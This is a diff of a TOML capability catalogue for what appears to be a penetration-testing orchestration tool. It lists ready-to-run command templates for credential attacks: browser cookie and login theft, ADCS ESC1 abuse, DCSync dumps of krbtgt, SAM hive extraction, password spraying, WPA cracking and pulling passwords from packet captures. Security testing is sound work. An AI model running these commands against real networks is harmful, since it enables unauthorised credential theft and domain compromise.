-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.secret-discovery'
-phase = 'credentials'
-label = 'SECRET DISCOVERY'
-summary = 'Scan filesystems and repositories for embedded secrets'
-inputs = [
-  { key = 'path', type = 'path', required = false, default = '/opt' },
-]
-[[capability.provider]]
-binary = 'trufflehog'
-[[capability.provider.operation]]
-name = 'Filesystem Scan'
-args = ['filesystem', '{path}', '--json']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'gitleaks'
-[[capability.provider.operation]]
-name = 'Directory Detect'
-args = ['dir', '{path}', '--no-banner']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'detect-secrets'
-[[capability.provider.operation]]
-name = 'Baseline Scan'
-args = ['scan', '{path}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'rip-secrets'
-[[capability.provider.operation]]
-name = 'Fast Scan'
-args = ['{path}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'grep'
-[[capability.provider.operation]]
-name = 'Pattern Sweep'
-args = ['-rnw', '{path}', '-ie', 'password=']
+args = ['?u?l?l?l?l?l?d?d?d?d', '--output-file', '/tmp/mask.txt']
 output = 'lines'
 network = false
-
-[[capability.provider.operation]]
-name = 'Key Sweep'
-args = ['-rnw', '{path}', '-ie', 'PRIVATE KEY']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'credentials.browser-extraction'
-phase = 'credentials'
-label = 'BROWSER EXTRACTION'
-summary = 'Extract saved browser credentials, cookies and history'
-inputs = [
-  { key = 'profile', type = 'path', required = true },
-]
 [[capability.provider]]
-binary = 'hack-browser-data'
+binary = 'sed'
 [[capability.provider.operation]]
-name = 'All Browsers'
-args = ['-b', 'all', '-f', 'json']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Chrome Only'
-args = ['-b', 'chrome', '-f', 'json']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Firefox Only'
-args = ['-b', 'firefox', '-f', 'json']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'dumpzilla'
-[[capability.provider.operation]]
-name = 'Firefox Dump'
-args = ['{profile}', '--All']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'sqlite3'
-[[capability.provider.operation]]
-name = 'Cookie Dump'
-args = ['{profile}', 'SELECT host_key, name, value FROM cookies']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Login Dump'
-args = ['{profile}', 'SELECT action_url, username_value FROM logins']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.adcs-abuse'
-phase = 'credentials'
-label = 'ADCS ABUSE'
-summary = 'Enumerate and abuse Active Directory Certificate Services'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-]
-[[capability.provider]]
-binary = 'certipy'
-[[capability.provider.operation]]
-name = 'CA Find'
-args = ['find', '-u', '{username}@{domain}', '-p', '{password}', '-dc-ip', '{target}', '-stdout']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Vulnerable Find'
-args = ['find', '-u', '{username}@{domain}', '-p', '{password}', '-dc-ip', '{target}', '-vulnerable', '-stdout']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Certificate Request'
-args = ['req', '-u', '{username}@{domain}', '-p', '{password}', '-ca', '{domain}-CA', '-template', 'ESC1', '-dc-ip', '{target}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'PFX Auth'
-args = ['auth', '-pfx', 'administrator.pfx', '-dc-ip', '{target}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Shadow Credential'
-args = ['shadow', 'auto', '-u', '{username}@{domain}', '-p', '{password}', '-dc-ip', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'openssl'
-[[capability.provider.operation]]
-name = 'PFX Key Extract'
-args = ['pkcs12', '-in', 'administrator.pfx', '-nocerts', '-out', 'admin_key.pem', '-nodes']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Certificate Inspect'
-args = ['x509', '-in', 'admin_cert.pem', '-text', '-noout']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.password-spraying'
-phase = 'credentials'
-label = 'PASSWORD SPRAYING'
-summary = 'Low and slow password spraying across authentication services'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-]
-[[capability.provider]]
-binary = 'nxc'
-[[capability.provider.operation]]
-name = 'SMB Spray'
-args = ['smb', '{target}', '-u', 'users.txt', '-p', '{password}', '--continue-on-success']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'WinRM Spray'
-args = ['winrm', '{target}', '-u', 'users.txt', '-p', '{password}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'LDAP Spray'
-args = ['ldap', '{target}', '-u', 'users.txt', '-p', '{password}', '--password-policy']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hydra'
-[[capability.provider.operation]]
-name = 'SSH Spray'
-args = ['-L', 'users.txt', '-p', '{password}', '{target}', 'ssh', '-t', '4']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'RDP Spray'
-args = ['-L', 'users.txt', '-p', '{password}', '{target}', 'rdp', '-t', '2']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'medusa'
-[[capability.provider.operation]]
-name = 'Parallel Audit'
-args = ['-H', 'targets.txt', '-U', 'users.txt', '-p', '{password}', '-M', 'ssh']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.token-manipulation'
-phase = 'credentials'
-label = 'TOKEN MANIPULATION'
-summary = 'Analyse and tamper with JWTs and secret tokens'
-inputs = [
-  { key = 'token', type = 'secret', required = true },
-]
-[[capability.provider]]
-binary = 'jwt_tool'
-[[capability.provider.operation]]
-name = 'Tamper Mode'
-args = ['{token}', '-X', 'a', '-o', 'admin']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Tamper Test'
-args = ['{token}', '-M', 'at']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Key Sign'
-args = ['{token}', '-T', '-S', 'hs256', '-k', 'secret.key']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'step'
-[[capability.provider.operation]]
-name = 'JWT Verify'
-args = ['crypto', 'jwt', 'verify', '{token}', '--key', 'pubkey.pem']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'JWT Inspect'
-args = ['crypto', 'jwt', 'inspect', '--insecure', '{token}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'jq'
-[[capability.provider.operation]]
-name = 'Token Extract'
-args = ['-r', '.token']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'credentials.dcsync'
-phase = 'credentials'
-label = 'DCSYNC REPLICATION'
-summary = 'Perform targeted directory replication of credential material'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-]
-[[capability.provider]]
-binary = 'impacket-secretsdump'
-[[capability.provider.operation]]
-name = 'Krbtgt Dump'
-args = ['{domain}/{username}:{password}@{target}', '-just-dc-user', 'krbtgt']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Admin Dump'
-args = ['{domain}/{username}:{password}@{target}', '-just-dc-user', 'Administrator']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nxc'
-[[capability.provider.operation]]
-name = 'DCSync Check'
-args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--ntds', 'drsuapi']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'pywerview'
-[[capability.provider.operation]]
-name = 'ACL Check'
-args = ['get-objectacl', '-w', '{domain}', '-u', '{username}', '-p', '{password}', '--resolve-sids']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.dpapi-extraction'
-phase = 'credentials'
-label = 'DPAPI EXTRACTION'
-summary = 'Recover DPAPI masterkeys and decrypt protected blobs'
-inputs = [
-  { key = 'blob', type = 'file', required = false },
-]
-[[capability.provider]]
-binary = 'pypykatz'
-[[capability.provider.operation]]
-name = 'Masterkey Dump'
-args = ['dpapi', 'minidump', 'lsass.dmp']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Live DPAPI'
-args = ['dpapi', 'live']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'impacket-dpapi'
-[[capability.provider.operation]]
-name = 'Masterkey Decrypt'
-args = ['masterkey', '-pvk', 'domain_backup.pvk', '-file', '{blob}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Credential Decrypt'
-args = ['credential', '-masterkey', 'KEY', '-file', '{blob}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.policy-enum'
-phase = 'credentials'
-label = 'POLICY ENUMERATION'
-summary = 'Enumerate password and lockout policy before spraying'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-]
-[[capability.provider]]
-binary = 'nxc'
-[[capability.provider.operation]]
-name = 'SMB Policy'
-args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--pass-pol']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'LDAP Policy'
-args = ['ldap', '{target}', '-u', '{username}', '-p', '{password}', '--password-policy']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'rpcclient'
-[[capability.provider.operation]]
-name = 'Domain Policy'
-args = ['-U', '{domain}/{username}%{password}', '{target}', '-c', 'getdompwinfo']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Domain Info'
-args = ['-U', '{domain}/{username}%{password}', '{target}', '-c', 'querydominfo']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'enum4linux-ng'
-[[capability.provider.operation]]
-name = 'Policy Audit'
-args = ['-P', '{target}', '-u', '{username}', '-p', '{password}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.artifact-extraction'
-phase = 'credentials'
-label = 'ARTIFACT EXTRACTION'
-summary = 'Extract credential artifacts from hives and shadow copies'
-inputs = [
-  { key = 'hive', type = 'file', required = false, default = '/tmp/sam.save' },
-]
-[[capability.provider]]
-binary = 'bkhive'
-[[capability.provider.operation]]
-name = 'Bootkey Extract'
-args = ['{hive}', 'bootkey.txt']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'samdump2'
-[[capability.provider.operation]]
-name = 'SAM Dump'
-args = ['{hive}', 'bootkey.txt']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hivexget'
-[[capability.provider.operation]]
-name = 'Hive Query'
-args = ['{hive}', 'Select', 'Current']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'reg'
-[[capability.provider.operation]]
-name = 'Hive Save'
-args = ['save', 'HKLM\SAM', 'C:\temp\sam.save']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.graph-mapping'
-phase = 'credentials'
-label = 'GRAPH MAPPING'
-summary = 'Collect identity graph data for credential privilege mapping'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-]
-[[capability.provider]]
-binary = 'bloodhound-python'
-[[capability.provider.operation]]
-name = 'Full Collection'
-args = ['-u', '{username}', '-p', '{password}', '-d', '{domain}', '-dc', '{target}', '-c', 'All', '--zip']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'DC Only'
-args = ['-u', '{username}', '-p', '{password}', '-d', '{domain}', '-c', 'DCOnly', '--zip']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Session Collection'
-args = ['-u', '{username}', '-p', '{password}', '-d', '{domain}', '-c', 'LoggedOn,Session']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'adidnsdump'
-[[capability.provider.operation]]
-name = 'DNS Export'
-args = ['-u', '{domain}\{username}', '-p', '{password}', '--dns-tcp', '{target}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.posture-report'
-phase = 'credentials'
-label = 'POSTURE REPORT'
-summary = 'Summarise cracked credentials and exposure posture'
-inputs = [
-  { key = 'hash', type = 'hash', required = true },
-]
-[[capability.provider]]
-binary = 'hashcat'
-[[capability.provider.operation]]
-name = 'Cracked Summary'
-args = ['-m', '1000', '{hash}', '--show']
+name = 'Domain Suffix Inject'
+args = ['s/$/{domain}/g', '{wordlist}', '>', '/tmp/suffixed.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'john'
+binary = 'sort'
 [[capability.provider.operation]]
-name = 'Cracked Summary'
-args = ['--show', '--format=NT', '{hash}']
+name = 'Dedupe Sort'
+args = ['-u', '-o', '/tmp/sorted.txt', '{wordlist}']
 output = 'lines'
 network = false
-[[capability.provider]]
-binary = 'gitleaks'
-[[capability.provider.operation]]
-name = 'Exposure Report'
-args = ['detect', '-s', '/opt', '--report-path', 'exposure.json', '--report-format', 'json']
-output = 'lines'
-network = true
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
-name = 'Metric Count'
-args = ['-l', 'cracked.txt']
+name = 'Wordlist Count'
+args = ['-l', '{wordlist}']
 output = 'lines'
 network = false
+[[capability.provider]]
+binary = 'head'
+[[capability.provider.operation]]
+name = 'Top Sample Check'
+args = ['-n', '50', '{wordlist}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Filter By Length'
+args = ['-E', '^.{8,}$', '{wordlist}', '>', '/tmp/filtered.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'kwprocessor'
+[[capability.provider.operation]]
+name = 'Keyboard Walk Generate'
+args = ['-z', '1', '-o', '/tmp/keywalk.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Wordlist Inventory'
+args = ['-la', '/usr/share/wordlists/']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.wireless-credential-audit'
+phase = 'credentials'
+label = 'WIRELESS CREDENTIAL AUDIT'
+summary = 'Extract and audit wireless credential material'
+inputs = [
+  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'WPA Key Recover'
+args = ['-w', '{wordlist}', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'WEP Key Recover'
+args = ['{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'WPA PMK Crack'
+args = ['-m', '22000', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'WPA PMKID Crack'
+args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcxpcapngtool'
+[[capability.provider.operation]]
+name = 'Handshake Convert'
+args = ['-o', '/tmp/hc.22000', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcxtools'
+[[capability.provider.operation]]
+name = 'PMKID Extract'
+args = ['-r', '{capture}', '-o', '/tmp/pmkid.16800']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'WPA Supplicant Read'
+args = ['/etc/wpa_supplicant/wpa_supplicant.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmcli'
+[[capability.provider.operation]]
+name = 'Saved WiFi Creds'
+args = ['connection', 'show']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmcli'
+[[capability.provider.operation]]
+name = 'WiFi Password Show'
+args = ['connection', 'show', 'MyWifi', '--show-secrets']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'NetworkManager System Read'
+args = ['/etc/NetworkManager/system-connections/*']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Wireless Interface Info'
+args = ['dev']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Capture Inventory'
+args = ['-la', '/tmp/*.cap']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.hash-extraction-pcap'
+phase = 'credentials'
+label = 'HASH EXTRACTION PCAP'
+summary = 'Extract authentication material from captured traffic'
+inputs = [
+  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.pcap' },
+]
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'NTLM Challenge Extract'
+args = ['-r', '{capture}', '-Y', 'ntlmssp', '-T', 'fields', '-e', 'ntlmssp.ntlmserverchallenge', '-e', 'ntlmssp.auth.username']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'NTLMv2 Response Extract'
+args = ['-r', '{capture}', '-Y', 'ntlmssp', '-T', 'fields', '-e', 'ntlmssp.auth.username', '-e', 'ntlmssp.auth.domain', '-e', 'ntlmssp.auth.ntresponse']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'HTTP Basic Extract'
+args = ['-r', '{capture}', '-Y', 'http.authorization', '-T', 'fields', '-e', 'http.authorization']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'HTTP POST Creds Extract'
+args = ['-r', '{capture}', '-Y', 'http.request.method == "POST"', '-T', 'fields', '-e', 'http.file_data']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'FTP Creds Extract'
+args = ['-r', '{capture}', '-Y', 'ftp.request.command == "USER" || ftp.request.command == "PASS"', '-T', 'fields', '-e', 'ftp.request.arg']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'POP Creds Extract'
+args = ['-r', '{capture}', '-Y', 'pop.request.command == "USER" || pop.request.command == "PASS"', '-T', 'fields', '-e', 'pop.request.arg']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'SMTP Auth Extract'
+args = ['-r', '{capture}', '-Y', 'smtp.req.command == "AUTH"', '-T', 'fields', '-e', 'smtp.req.parameters']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Kerberos Ticket Extract'
+args = ['-r', '{capture}', '-Y', 'kerberos', '-T', 'fields', '-e', 'kerberos.cname', '-e', 'kerberos.realm']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'LDAP Bind Extract'
+args = ['-r', '{capture}', '-Y', 'ldap.message.protocolop', '-T', 'fields', '-e', 'ldap.simpleBind.username', '-e', 'ldap.simpleBind.password']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Cookie Extract'
+args = ['-r', '{capture}', '-Y', 'http.cookie', '-T', 'fields', '-e', 'http.cookie']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'urlsnarf'
+[[capability.provider.operation]]
+name = 'Live URL Credential Sniff'
+args = ['-i', 'eth0']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Auth Traffic Capture'
+args = ['-i', 'eth0', '-w', '/tmp/authsniff.pcap', 'port', '80', 'or', 'port', '21', 'or', 'port', '110']
+output = 'lines'
+network = true
 
 # --------------------------------------------------------------------------
 # LATERAL MOVEMENT
